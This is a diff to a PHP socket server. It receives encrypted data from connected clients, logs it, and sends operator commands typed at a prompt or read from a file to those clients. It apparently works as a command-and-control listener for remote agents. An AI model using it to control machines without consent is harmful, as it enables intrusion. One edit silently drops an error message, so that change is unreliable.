@@ -72,7 +72,9 @@
 		    $connected_clients [] = array("ip" => $ip, "port" => $port);
 
 			_log(LOGFILE, "Client connected on IP: [".$ip.":".$port."]\n");
-		    echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";
+			echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";
+			
+			// TODO: key-exchange
 
 	        // remove the listening socket from the clients-with-data array
 	        $key = array_search($clients, $recv);
@@ -94,14 +96,12 @@
 	        {
 	        	$all_bytes += $bytes;
 				echo "\33[94mBytes recieved: ".$bytes."\33[0m\n";
-
         	  	$lastError = socket_last_error($recv_sock);
 
 			    if($bytes === 0){		
 					if($lastError !== 0){
 						_log(LOGFILE, "Error: ".$lastError." :: ".socket_strerror($lastError)."\n");
 						echo "Error: ".$lastError." :: ".socket_strerror($lastError)."\n";
-
 					}
 	   
 			        $key  = array_search($recv_sock, $clients);
@@ -116,13 +116,13 @@
 		            echo "[".$now."] \33[91mClient ".$ip.":".$port." disconnected.\33[0m\n";
 		            break;
 			    }
-			    else if (intval($bytes) > 0) {
+			    else if ($bytes > 0){
 			        $data .= $buffer;
 			    }
 			    else {
-					echo ($lastError !== 0)
-						 ? "No data\nError: ".$lastError." :: ".socket_strerror($lastError)."\n"
-						 : "";
+					if($lastError !== 0){
+						"No data\nError: ".$lastError." :: ".socket_strerror($lastError)."\n";
+					}
 			    }
 	        }
 
@@ -130,7 +130,7 @@
 				echo "\33[95mOverall bytes recieved: ".$all_bytes."\33[0m\n";
 				_log(LOGFILE, "Overall bytes recieved: ".$all_bytes."\n");
 			}
-	        if($data !== ""){
+	        if(! empty($data)){
 				$data = $openssl_encrypt_decrypt->decrypt_cbc($data, ENCRYPTION_KEY);
 				_log(LOGFILE,
 					"Client [".$ip.":".$port."]\n"
@@ -138,7 +138,6 @@
 					.$data."\n"
 					.DELIMITER."\n"
 				);
-
 				echo "[".$now."] Client [\33[36m".$ip.":".$port."\33[0m]\n"
 					.DELIMITER."\n"
 					.$data."\n"
@@ -146,19 +145,19 @@
 	        }
 		}
 		$line = readline(">>> ");
-		if($line !== ""){
+		if(! empty($line)){
 			readline_add_history($line);
 		}
 
 		// reading/sending a file of commands
-		if(preg_match('/^(\-f)*\s(\.{0,2}\/)*\w*\.\w{2,3}$/', $line))
+		if(preg_match('/^(\-f)\s(\.{0,2}\/)*\w*\.\w{2,3}$/', $line))
 		{
 			$file = substr($line, 3);
 
 			if(file_exists($file))
 			{
 				$fp = fopen($file, 'rb');
-				$cmdsarr = explode("\n", fread($fp, filesize($file)));
+				$cmdsarr = explode("\n", fread($fp, filesize($file))); // 1 line 1 cmd
 				fclose($fp);
 				$full_cmd = "";
 				
@@ -188,7 +187,6 @@
 
 	    switch ($line)
 	    {
-
 	    	case 'clients':
 	    		echo "\33[36mClients: ".(count($clients)-1)."\33[0m\n";
 	    		print_r($connected_clients);
@@ -222,7 +220,7 @@
 			    sleep(1); // wait for response
 			}
 		}
-		if(count($clients) === 1){	// only master socket => no client
+		if(count($clients) === 1){	// only master socket => no clients
 			echo "[\33[91mNo connected clients\33[0m]: Listening..\n";
 			$line = "";
 		}
